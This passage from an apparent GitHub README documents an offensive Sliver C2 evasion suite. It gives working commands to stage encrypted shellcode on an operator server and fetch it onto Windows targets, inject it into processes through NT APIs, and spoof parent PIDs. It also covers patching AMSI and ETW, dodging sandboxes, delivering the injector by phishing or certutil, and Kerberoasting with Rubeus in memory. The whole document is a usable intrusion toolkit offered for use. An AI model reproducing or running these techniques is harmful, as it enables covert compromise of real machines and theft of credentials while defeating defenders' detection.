The staging model is identical to LoadKit. On your operator machine, `injectkit stage` XOR-encrypts the shellcode with a random 32-byte key, writes the encrypted blob to `payload.enc`, and starts a one-shot HTTPS server. The key is printed as 64 hex characters. You pass it as the `key=` argument when you invoke the Extension or as `-key` on the EXE.

On the target side, whichever binary is running makes an outbound HTTPS request directly to your operator machine to download `payload.enc`. It does not go through the Sliver C2 channel. This is the same pattern LoadKit uses for delivering Donut shellcode. If your beacon is already calling back, the network path exists and the Extension fetch will work.

The staging server shuts down 500ms after the first successful download. Anybody who finds the URL in network logs and tries to replay it gets a 404 and nothing else.

### 5.3 Architecture

[Permalink: 5.3 Architecture](https://github.com/Squ1shification/SliverC2-Evasion-Suite#53-architecture)

```
Operator (Linux)                        Target (Windows)
────────────────────────                ─────────────────────────────────────────────
injectkit stage
  │
  ├─ random 32-byte XOR key
  ├─ XOR-encrypt shellcode
  ├─ write payload.enc
  ├─ print injectkit.exe command
  └─ one-shot HTTPS server ───────────▶ Scenario A: no session (injectkit.exe)
                                           Anti-sandbox: sleep 3s + CPU count check
                                           AMSI patch: AmsiScanBuffer → E_INVALIDARG
                                           ETW patch:  EtwEventWrite → ret
                                           HTTPS GET → XOR-decrypt shellcode
                                                │
                                                └─ Target Mode: NtOpenProcess(running process)
                                                   Spawn Mode:  CreateProcessW(new process)
                                                                 + PPID spoof via PROC_THREAD_ATTRIBUTE
                                                   Both:  NtAllocVM(RW) → NtWriteVM
                                                          NtProtectVM(RX) → NtCreateThreadEx
                                                          Injector exits cleanly

injectkit stage ────────────────────────▶ Scenario B: inside a session (inject.x64.dll)
                                           HTTPS GET → XOR-decrypt shellcode
                                           (payload fetched directly from operator, NOT via C2 channel)
                                                │
                                                └─ Same NT API injection chain as above
                                                   Returns to Sliver console when done

Both scenarios: shellcode calls back to Sliver C2
```

### 5.4 Injection Modes

[Permalink: 5.4 Injection Modes](https://github.com/Squ1shification/SliverC2-Evasion-Suite#54-injection-modes)

#### Target Mode

[Permalink: Target Mode](https://github.com/Squ1shification/SliverC2-Evasion-Suite#target-mode)

Finds a running process by name and injects into it. The process must be accessible from your integrity level (user-level processes are fine; SYSTEM-level ones typically are not).

```
# From a Sliver session (use the full staging URL printed by injectkit stage):
inject url=https://192.162.1.10:8443/a3f91c04b2e8d17f key=a1b2c3... target=explorer.exe

# Standalone EXE on target:
injectkit.exe -mode stager -url https://192.162.1.10:8443/a3f91c04b2e8d17f -key a1b2c3... -target explorer.exe
```

```
Execution chain (target mode):

  1. Fetch + XOR-decrypt shellcode from staging URL
  2. NtOpenProcess (PID from CreateToolhelp32Snapshot)
  3. NtAllocateVirtualMemory(PAGE_READWRITE) in target
  4. NtWriteVirtualMemory — copy shellcode into target
  5. NtProtectVirtualMemory(PAGE_EXECUTE_READ)     ← no RWX window
  6. NtCreateThreadEx in target process
  7. Injector exits / returns to Sliver console
```

#### Spawn Mode

[Permalink: Spawn Mode](https://github.com/Squ1shification/SliverC2-Evasion-Suite#spawn-mode)

Spawns a fresh process with a spoofed parent PID, then injects into it. The spawned process shows up in the process tree under whichever parent you chose, regardless of who actually created it.

```
# From a Sliver session (use the full staging URL printed by injectkit stage):
inject url=https://192.162.1.10:8443/a3f91c04b2e8d17f key=a1b2c3... spawn=RuntimeBroker.exe ppid=explorer.exe

# Standalone EXE on target:
injectkit.exe -mode stager -url https://192.162.1.10:8443/a3f91c04b2e8d17f -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe
```

```
Execution chain (spawn mode):

  1. Fetch + XOR-decrypt shellcode
  2. Find explorer.exe PID (the spoofed parent)
  3. OpenProcess(PROCESS_CREATE_PROCESS) on explorer
  4. InitializeProcThreadAttributeList
       + UpdateProcThreadAttribute(PARENT_PROCESS = explorer)
  5. CreateProcessW(RuntimeBroker.exe,
       CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT)
     → RuntimeBroker.exe reports explorer.exe as its parent in all process-tree tools
  6. Remote inject via the same NT API chain as target mode
  7. Injector exits
```

### 5.5 PPID Spoofing

[Permalink: 5.5 PPID Spoofing](https://github.com/Squ1shification/SliverC2-Evasion-Suite#55-ppid-spoofing)

Without spoofing, the process tree tells the whole story:

```
cmd.exe → powershell.exe → injectkit.exe → RuntimeBroker.exe    ← obviously wrong
```

With spoofing:

```
explorer.exe → RuntimeBroker.exe                                 ← looks normal
```

The mechanism is `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`, set before the process is created:

```
HANDLE hExplorer = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorer_pid);

LPPROC_THREAD_ATTRIBUTE_LIST attr = /* allocate */;
InitializeProcThreadAttributeList(attr, 1, 0, &size);
UpdateProcThreadAttribute(attr, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &hExplorer, sizeof(HANDLE), NULL, NULL);

STARTUPINFOEXW si = { .lpAttributeList = attr };
CreateProcessW(L"RuntimeBroker.exe", ...,
    CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, ..., &si, &pi);
```

The kernel records `explorer.exe` as the parent PID. That is what Sysmon Event ID 1, Process Explorer, and EDR process-tree views all read via `NtQueryInformationProcess`. Spoofing the PPID does not change the security token (it is still your user's token, not explorer's) and kernel audit events record the real creator. It fools the process tree view, not a forensic investigation.

### 5.6 Evasion Techniques

[Permalink: 5.6 Evasion Techniques](https://github.com/Squ1shification/SliverC2-Evasion-Suite#56-evasion-techniques)

#### No RWX Pages

[Permalink: No RWX Pages](https://github.com/Squ1shification/SliverC2-Evasion-Suite#no-rwx-pages)

Memory is allocated `PAGE_READWRITE`, shellcode is written in, then flipped to `PAGE_EXECUTE_READ` before the thread starts. The region is never simultaneously writable and executable. This is the single most common shellcode detection heuristic and InjectKit avoids it entirely.

#### NT-Native APIs

[Permalink: NT-Native APIs](https://github.com/Squ1shification/SliverC2-Evasion-Suite#nt-native-apis)

EDRs hook the Win32 layer in `kernel32.dll`: `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`. InjectKit skips that layer entirely and calls `ntdll.dll` directly: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`. Most EDRs hook fewer functions at the NT layer, and the ones that do require considerably more effort to maintain.

#### AMSI and ETW Patches (Standalone EXE Only)

[Permalink: AMSI and ETW Patches (Standalone EXE Only)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#amsi-and-etw-patches-standalone-exe-only)

`injectkit.exe` patches two things in its own process before touching anything else. `AmsiScanBuffer` is patched to return `E_INVALIDARG` (0x80070057) so every AV scan inside the injector process comes back as not applicable. `EtwEventWrite` is replaced with a `ret` so the process emits zero ETW events for the duration. Neither patch affects the target process the shellcode lands in; that process needs its own bypass if required. MaskKit and Donut both include one.

#### Anti-Sandbox

[Permalink: Anti-Sandbox](https://github.com/Squ1shification/SliverC2-Evasion-Suite#anti-sandbox)

Before doing anything else, the EXE sleeps for 3 seconds and checks wall-clock time. If a sandbox accelerated execution and less than 2 seconds elapsed, it exits silently. It also checks CPU count: fewer than 2 cores means single-core sandbox VM, also a silent exit. No error message, no crash, nothing interesting for an automated analysis system to report.

### 5.7 Setup

[Permalink: 5.7 Setup](https://github.com/Squ1shification/SliverC2-Evasion-Suite#57-setup)

```
# Go 1.21+ and mingw-w64 are required
go version
sudo apt install mingw-w64

cd Inject-Kit/injectkit
make all
```

Output of `make all`:

- `./injectkit` — operator CLI (Linux)
- `build/injectkit.exe` — standalone Windows EXE
- `build/inject.x64.dll` — Sliver Extension DLL
- `build/inject-0.1.0.tar.gz` — Sliver Extension tarball

### 5.8 Full Usage — Standalone (`injectkit.exe`)

[Permalink: 5.8 Full Usage — Standalone (injectkit.exe)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#58-full-usage--standalone-injectkitexe)

Use this when you have no Sliver session yet. Get shellcode to the target, run the EXE, get a callback. The EXE exits after injection so there is no persistent injector process to clean up.

#### 5.8.1 Encrypt and Stage (Operator Side)

[Permalink: 5.8.1 Encrypt and Stage (Operator Side)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#581-encrypt-and-stage-operator-side)

```
cd Inject-Kit/injectkit

./injectkit stage \
    --shellcode palace.bin \
    --url https://192.162.1.10:8443 \
    --serve
```

```
[+] payload → build/payload.enc
[+] key     → a1b2c3d4e5f6...
[*] One-shot HTTPS server on :8443 — shuts down after one download
[+] Staging URL: https://192.162.1.10:8443/a3f91c04b2e8d17f
    (random path generated automatically — only this URL works)

Run on target:
  injectkit.exe -mode stager -url https://192.162.1.10:8443/a3f91c04b2e8d17f \
                -key a1b2c3d4e5f6... -spawn RuntimeBroker.exe -ppid explorer.exe
```

Copy the printed command. Deliver `injectkit.exe` to the target via phishing, exploit, or whatever got you initial access and run it.

#### 5.8.2 Stager Mode — Inject into Running Process

[Permalink: 5.8.2 Stager Mode — Inject into Running Process](https://github.com/Squ1shification/SliverC2-Evasion-Suite#582-stager-mode--inject-into-running-process)

```
injectkit.exe -mode stager -url https://192.162.1.10:8443/a3f91c04b2e8d17f -key a1b2c3... -target explorer.exe
```

#### 5.8.3 Stager Mode — Spawn with PPID Spoof

[Permalink: 5.8.3 Stager Mode — Spawn with PPID Spoof](https://github.com/Squ1shification/SliverC2-Evasion-Suite#583-stager-mode--spawn-with-ppid-spoof)

```
injectkit.exe -mode stager -url https://192.162.1.10:8443/a3f91c04b2e8d17f -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe
```

`RuntimeBroker.exe` shows up under `explorer.exe` in the process tree. The EXE exits silently with no console output.

#### 5.8.4 Direct Mode — Shellcode Baked In

[Permalink: 5.8.4 Direct Mode — Shellcode Baked In](https://github.com/Squ1shification/SliverC2-Evasion-Suite#584-direct-mode--shellcode-baked-in)

When the target cannot reach your staging server, bake the shellcode directly into the EXE at compile time:

```
# Generate XOR-encrypted Go byte arrays from your shellcode
python3 -c "
import os, sys
key = os.urandom(32)
sc  = open(sys.argv[1], 'rb').read()
enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(sc))
print('var xorKey = []byte{' + ', '.join(hex(b) for b in key) + '}')
print('var encShellcode = []byte{' + ', '.join(hex(b) for b in enc) + '}')
" palace.bin
```

```
# Paste the output into runner/shellcode.go, then compile
make runner

# Deploy build/injectkit.exe — no URL or staging server needed
injectkit.exe -mode direct -target explorer.exe
```

#### 5.8.5 Re-Serve for a Second Attempt

[Permalink: 5.8.5 Re-Serve for a Second Attempt](https://github.com/Squ1shification/SliverC2-Evasion-Suite#585-re-serve-for-a-second-attempt)

```
./injectkit serve --payload build/payload.enc --port 8443
```

**Note:**`injectkit serve` generates a new random URL path every time it runs. The URL baked into your existing `injectkit.exe` or Sliver extension command will not match. Either re-run `injectkit stage` to rebuild the EXE with the new URL, or deliver the new staging URL manually if your target can accept it.

#### 5.8.6 Getting `injectkit.exe` to the Target

[Permalink: 5.8.6 Getting injectkit.exe to the Target](https://github.com/Squ1shification/SliverC2-Evasion-Suite#586-getting-injectkitexe-to-the-target)

| Method | Notes |
| --- | --- |
| Phishing attachment | EXE, or wrapped in an Office macro / LNK file |
| Living-off-the-land download | `certutil -urlcache -f`, `curl`, PowerShell `WebClient` |
| Sliver `upload` | If you have a session in another process already |
| USB / physical access | Air-gapped environments |

### 5.9 Full Usage — Sliver Extension (`inject.x64.dll`)

[Permalink: 5.9 Full Usage — Sliver Extension (inject.x64.dll)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#59-full-usage--sliver-extension-injectx64dll)

Once you have an active Sliver session, `inject.x64.dll` works exactly like `load.x64.dll` from LoadKit: install it once, call it from the console. The Extension fetches the payload directly from your staging server over HTTPS, the same way LoadKit does. It does not route the payload through the Sliver C2 channel.

#### 5.9.1 Install the Extension (Once Per Sliver Server)

[Permalink: 5.9.1 Install the Extension (Once Per Sliver Server)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#591-install-the-extension-once-per-sliver-server)

```
cd Inject-Kit/injectkit
make all
```

```
sliver (TARGET)> extensions install build/inject-0.1.0.tar.gz
[*] Installing extension 'inject' (v0.1.0) ... done
```

The extension persists for the Sliver server's lifetime. Install it once and it is available from every session.

#### 5.9.2 Stage the Shellcode (Operator Side)

[Permalink: 5.9.2 Stage the Shellcode (Operator Side)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#592-stage-the-shellcode-operator-side)

```
cd Inject-Kit/injectkit

./injectkit stage \
    --shellcode palace2.bin \
    --url https://192.162.1.10:8443 \
    --serve
```

```
[+] payload → build/payload.enc
[+] key     → b9c8d7e6f5a4...
[*] One-shot HTTPS server on :8443 — shuts down after one download
[+] Staging URL: https://192.162.1.10:8443/f7e2a91b3c04d58e
```

#### 5.9.3 Inject into an Existing Process

[Permalink: 5.9.3 Inject into an Existing Process](https://github.com/Squ1shification/SliverC2-Evasion-Suite#593-inject-into-an-existing-process)

```
sliver (TARGET)> inject url=https://192.162.1.10:8443/f7e2a91b3c04d58e key=b9c8d7e6f5a4... target=explorer.exe
[+] injected into explorer.exe (pid 1234) — shellcode running
```

#### 5.9.4 Spawn + Inject with PPID Spoof

[Permalink: 5.9.4 Spawn + Inject with PPID Spoof](https://github.com/Squ1shification/SliverC2-Evasion-Suite#594-spawn--inject-with-ppid-spoof)

```
sliver (TARGET)> inject url=https://192.162.1.10:8443/f7e2a91b3c04d58e key=b9c8d7e6f5a4... spawn=dllhost.exe ppid=svchost.exe
[+] spawned dllhost.exe (pid 7890) with ppid spoofed to svchost.exe — shellcode running
```

Your second beacon calls back from inside `dllhost.exe`, looking like a child of `svchost.exe` to everything that reads the process tree.

### 5.10 Command Reference

[Permalink: 5.10 Command Reference](https://github.com/Squ1shification/SliverC2-Evasion-Suite#510-command-reference)

| Tool | Command / Flag | Purpose |
| --- | --- | --- |
| **Operator CLI** (`injectkit`) | `injectkit stage --shellcode <f> --url <url> [--serve] [--port 8443] [-o build]` | XOR-encrypt shellcode, optionally start one-shot HTTPS server |
|  | `injectkit serve --payload <f> [--port 8443]` | Re-serve an existing `payload.enc` |
|  | `injectkit bundle [--output build/inject-0.1.0.tar.gz]` | Package extension tarball for `extensions install` |
| **Standalone** (`injectkit.exe`) | `-mode string` | `stager` (default) or `direct` (shellcode baked in) |
|  | `-url string` / `-key string` | Staging URL and 64-hex XOR key (stager mode) |
|  | `-target string` | Inject into this running process |
|  | `-spawn string` / `-ppid string` | Spawn this process with parent spoofed to `-ppid` (default: explorer.exe) |
| **Sliver Extension** (`inject`) | `inject url=<url> key=<hex> target=<process.exe>` | Inject into a running process from an active session |
|  | `inject url=<url> key=<hex> spawn=<process.exe> ppid=<parent.exe>` | Spawn + inject with PPID spoof from an active session |

### 5.11 Troubleshooting

[Permalink: 5.11 Troubleshooting](https://github.com/Squ1shification/SliverC2-Evasion-Suite#511-troubleshooting)

| Symptom | Cause and fix |
| --- | --- |
| `NtOpenProcess` returns `0xC0000022` (ACCESS\_DENIED) | The target process is protected. SYSTEM-level processes like `svchost.exe` are not openable from a user context. Use `explorer.exe`, `RuntimeBroker.exe`, or `SearchHost.exe` instead. |
| `CreateProcessW` fails in spawn mode | Windows needs a resolvable path. Use `C:\Windows\System32\RuntimeBroker.exe` and verify the binary exists on the target before trying. |
| No Sliver callback after injection | Three things to check: the firewall allows outbound traffic from the target process, your Sliver listener is running, and the shellcode is x64 (the injector is x64-only). |
| Sliver says extension not found | Re-run `extensions install build/inject-0.1.0.tar.gz` from within a session. The extension persists per server, not per session, but a server restart wipes it. |

* * *

## 6\. Cross-Cutting Evasion Techniques

[Permalink: 6. Cross-Cutting Evasion Techniques](https://github.com/Squ1shification/SliverC2-Evasion-Suite#6-cross-cutting-evasion-techniques)

The same primitives recur across all four kits because they're the right answer to common EDR strategies:

### 6.1 ROR13 API Hashing — No IAT, No Strings

[Permalink: 6.1 ROR13 API Hashing — No IAT, No Strings](https://github.com/Squ1shification/SliverC2-Evasion-Suite#61-ror13-api-hashing--no-iat-no-strings)

Every kit resolves Windows APIs by walking the PEB's `InLoadOrderModuleList`, hashing each exported function name with ROR13, and matching against hardcoded 32-bit constants. The loader binary contains zero recognizable function-name strings and zero IAT entries. Hashes are stable across Windows versions (function names don't change) and the binary is ASLR-independent.

### 6.2 No RWX, No Static Imports of Sensitive DLLs

[Permalink: 6.2 No RWX, No Static Imports of Sensitive DLLs](https://github.com/Squ1shification/SliverC2-Evasion-Suite#62-no-rwx-no-static-imports-of-sensitive-dlls)

Allocations are always `PAGE_READWRITE` → copy → `PAGE_EXECUTE_READ`. Sensitive libraries like `winhttp.dll`, `amsi.dll`, `wldp.dll`, and `mscoree.dll` are loaded dynamically with `LoadLibraryA` \+ `GetProcAddress`, keeping them off the static import table.

### 6.3 ChaCha20-Poly1305 Staging with Auth-Tag Drop

[Permalink: 6.3 ChaCha20-Poly1305 Staging with Auth-Tag Drop](https://github.com/Squ1shification/SliverC2-Evasion-Suite#63-chacha20-poly1305-staging-with-auth-tag-drop)

CrystalKit upgrades CrystalSliver's AES-CBC staging to ChaCha20-Poly1305. If the staged payload is tampered with in transit, the auth-tag check fails and the loader exits silently before allocating any executable memory — turning a tamper attempt into a soft fail rather than an alert.

### 6.4 One-Shot Self-Signed HTTPS Servers

[Permalink: 6.4 One-Shot Self-Signed HTTPS Servers](https://github.com/Squ1shification/SliverC2-Evasion-Suite#64-one-shot-self-signed-https-servers)

All four kits use the same staging primitive: a self-signed ECDSA P-256 HTTPS server on a random URL path, configured to shut down 500 ms after the first successful download. Defenders who pull the URL from network logs and replay get a 404 — the payload is unrecoverable. Each rebuild generates a fresh URL and a fresh key.

### 6.5 Position-Independent Code

[Permalink: 6.5 Position-Independent Code](https://github.com/Squ1shification/SliverC2-Evasion-Suite#65-position-independent-code)

Every shellcode artifact is fully PIC: REL32 relocations resolved at link time, RIP-relative addressing in code, no PE headers, no relocation directory. The blob runs identically wherever it's loaded in memory, so chaining it through a process injector or sleep masker requires no additional fixup.

* * *

## 7\. Full Engagement Chain

[Permalink: 7. Full Engagement Chain](https://github.com/Squ1shification/SliverC2-Evasion-Suite#7-full-engagement-chain)

_Scenario: Initial access on a workstation. You want a persistent, evasive Sliver session inside a legitimate process, with memory scanning protection on every sleep cycle and redundant session capability._

### 7.1 Phase 1 — Generate and Harden the Implant

[Permalink: 7.1 Phase 1 — Generate and Harden the Implant](https://github.com/Squ1shification/SliverC2-Evasion-Suite#71-phase-1--generate-and-harden-the-implant)

Build the shellcode in three nested layers: Sliver inside MaskKit (sleep masking) inside PalaceKit (Crystal Palace PIC loader).

```
# 1. Generate raw Sliver shellcode
sliver > generate --format shellcode --os windows --arch amd64 --mtls 192.162.1.10 --save implant.bin

# 2. Wrap with MaskKit — installs NtWaitForSingleObject hook, XOR-encrypts Sliver
#    in memory during every C2 sleep, stack-spoofs the masker thread
cd /home/kali/Sliver-Evasion-Suite/Sleep-Mask-Kit/maskkit
./maskkit wrap --shellcode implant.bin --threshold 5000 --output masked.bin

# 3. Wrap with PalaceKit — Crystal Palace PIC loader around the masked blob:
#    no PE headers, no IAT, ROR13 PEB walk, no-RWX self-protect
cd /home/kali/Sliver-Evasion-Suite/Crystal-Palace-Kit/palacekit
./palacekit build --shellcode masked.bin --output palace.bin
```

`palace.bin` is now a flat PIC shellcode blob with three nested layers:

| Layer | Component | What it does |
| --- | --- | --- |
| Outer | PalaceKit loader | Decrypts the inner blob; NtCreateThreadEx's it; no IAT, ROR13 PEB walk, no RWX |
| Middle | MaskKit masker | Hooks `NtWaitForSingleObject`; XOR-encrypts + drops RX bit during every C2 sleep; stack-spoofs |
| Inner | Sliver shellcode | mTLS C2 implant; decrypted and run by MaskKit on each wake |

### 7.2 Phase 2 — Stage and Inject (First Session, No Existing Sliver Session)

[Permalink: 7.2 Phase 2 — Stage and Inject (First Session, No Existing Sliver Session)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#72-phase-2--stage-and-inject-first-session-no-existing-sliver-session)

No Sliver session yet — use the InjectKit standalone runner to deliver the payload from initial access.

```
# Operator: encrypt and start the one-shot staging server
cd Inject-Kit/injectkit
./injectkit stage --shellcode palace.bin --url https://192.162.1.10:8443 --serve

# Output:
# [+] payload → build/payload.enc
# [+] key     → a1b2c3d4...
# [*] One-shot HTTPS server on :8443 — shuts down after one download
# [+] Staging URL: https://192.162.1.10:8443/a3f91c04b2e8d17f
#
# Run on target:
#   injectkit.exe -mode stager -url https://192.162.1.10:8443/a3f91c04b2e8d17f \
#                 -key a1b2c3d4... -spawn RuntimeBroker.exe -ppid explorer.exe
```

Deliver `injectkit.exe` to the target via phishing, exploit, or USB — whatever gave initial access. Run the printed command.

`RuntimeBroker.exe` appears in the process tree under `explorer.exe`. Its memory contains the PalaceKit shellcode, which decrypts and runs the MaskKit masker, which decrypts and runs Sliver. The session calls back.

### 7.3 Phase 3 — Tool Execution in Session (LoadKit)

[Permalink: 7.3 Phase 3 — Tool Execution in Session (LoadKit)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#73-phase-3--tool-execution-in-session-loadkit)

You're in the session. Run Rubeus kerberoasting without writing to disk:

```
# Operator: convert Rubeus to Donut shellcode, XOR-encrypt, serve
cd Loader-Kit/loadkit
./loadkit load \
    --binary Rubeus.exe \
    --args "kerberoast /nowrap" \
    --url https://192.162.1.10:8443 \
    --serve

# [+] payload → build/payload.enc
# [+] key     → c3d4e5f6a7b8...
# [*] One-shot HTTPS server on :8443 — shuts down after one download
# [+] Staging URL: https://192.162.1.10:8443/e1d2c3b4a5960718
#     sliver (TARGET)> load url=https://192.162.1.10:8443/e1d2c3b4a5960718 key=c3d4e5f6a7b8...
```

```
sliver (TARGET)> load url=https://192.162.1.10:8443/e1d2c3b4a5960718 key=c3d4e5f6a7b8...
```

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/   v2.2.3

[*] Action: Kerberoasting
[*] Total kerberoastable users : 2
[*] SamAccountName : svc_sql
$krb5tgs$23$*svc_sql$CORP.LOCAL$...HASH...*
```

Rubeus runs entirely in memory inside the Sliver agent process. AMSI patched (Donut bypass=3), no disk touch, output captured and returned to the Sliver console.

### 7.4 Phase 4 — Lateral Movement / Second Beacon (InjectKit from Session)

[Permalink: 7.4 Phase 4 — Lateral Movement / Second Beacon (InjectKit from Session)](https://github.com/Squ1shification/SliverC2-Evasion-Suite#74-phase-4--lateral-movement--second-beacon-injectkit-from-session)

Establish a second beacon in a different process for redundancy or to pivot — without leaving the current session:

```
# Operator: generate a fresh shellcode, wrap with PalaceKit, stage
sliver > generate --format shellcode --os windows --arch amd64 --mtls 192.162.1.10 --save implant2.bin

cd Crystal-Palace-Kit/palacekit
./palacekit build --shellcode implant2.bin --output palace2.bin

cd Inject-Kit/injectkit
./injectkit stage --shellcode palace2.bin --url https://192.162.1.10:8443 --serve

# [+] Staging URL: https://192.162.1.10:8443/f7e2a91b3c04d58e
```

```
sliver (TARGET)> inject url=https://192.162.1.10:8443/f7e2a91b3c04d58e key=<hex> spawn=dllhost.exe ppid=svchost.exe
[+] spawned dllhost.exe (pid 7890) with ppid spoofed to svchost.exe — shellcode running
```

Second Sliver session calls back from inside `dllhost.exe`, appearing to be a child of `svchost.exe` in all process-tree views. You now have two independent sessions; losing one doesn't end the engagement.

### 7.5 Layer Coverage

[Permalink: 7.5 Layer Coverage](https://github.com/Squ1shification/SliverC2-Evasion-Suite#75-layer-coverage)

| Detection Surface | Kit that covers it |
| --- | --- |
| PE headers / IAT in shellcode memory | PalaceKit — no PE structure, ROR13 PEB walk, no IAT |
| Executable memory during C2 sleep | MaskKit — XOR-encrypt + drop RX bit + stack spoof during every sleep |
| Process origin / suspicious parent | InjectKit — PPID spoofing + NT-native injection (no Win32 hooks) |
| Post-ex tools on disk or in memory | LoadKit — Donut shellcode, AMSI+WLDP bypass, RX-only, in-agent-process |
| RWX memory anywhere | All four kits — RW → write → RX, never RWX |
| Function name strings / static imports | All four kits — runtime resolution via ROR13 PEB walk or `GetProcAddress` |
| Staged payload replay | All four kits — one-shot HTTPS server dies 500ms after first fetch |

* * *

## 8\. Build Prerequisites

[Permalink: 8. Build Prerequisites](https://github.com/Squ1shification/SliverC2-Evasion-Suite#8-build-prerequisites)

```
# Cross-compiler for Windows targets
sudo apt install mingw-w64

# Go toolchain
go version

# Optional: binary obfuscation for Go binaries
go install mvdan.cc/garble@latest
```

## 9\. Build Each Kit

[Permalink: 9. Build Each Kit](https://github.com/Squ1shification/SliverC2-Evasion-Suite#9-build-each-kit)

```
# Loader Kit
cd Loader-Kit/loadkit
make all          # CLI + cross-compiled load.x64.dll + extension tarball

# Sleep Mask Kit — MaskKit (C shellcode + Go CLI)
cd Sleep-Mask-Kit/maskkit
make all          # masker COFF objects + maskkit CLI

# Sleep Mask Kit — SleepKit (Go EXE)
cd Sleep-Mask-Kit/sleepkit
go build -o sleepkit ./cmd/sleepkit

# Crystal Palace Kit — PalaceKit (free Crystal Palace replacement)
cd Crystal-Palace-Kit/palacekit
make all          # unity build (loader.x64.o) + 5 stub objects + palacekit CLI

# Crystal Palace Kit — CrystalKit (operator workflow)
cd Crystal-Palace-Kit/crystalkit
go build -o crystalkit ./cmd/crystalkit

# Inject Kit
cd Inject-Kit/injectkit
make all          # operator CLI + injectkit.exe + inject.x64.dll + extension tarball
```

* * *

## License

[Permalink: License](https://github.com/Squ1shification/SliverC2-Evasion-Suite#license)

Copyright © Wencheng Xue

## About

Four-kit defense evasion suite for Sliver C2: Crystal Palace loader, sleep masking, in-memory PE execution, and remote process injection with PPID spoofing.

### Resources

[Readme](https://github.com/Squ1shification/SliverC2-Evasion-Suite#readme-ov-file)

[Activity](https://github.com/Squ1shification/SliverC2-Evasion-Suite/activity)

### Stars

**94** stars

### Watchers

**1** watching

### Forks

[**18** forks](https://github.com/Squ1shification/SliverC2-Evasion-Suite/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FSqu1shification%2FSliverC2-Evasion-Suite&report=Squ1shification+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.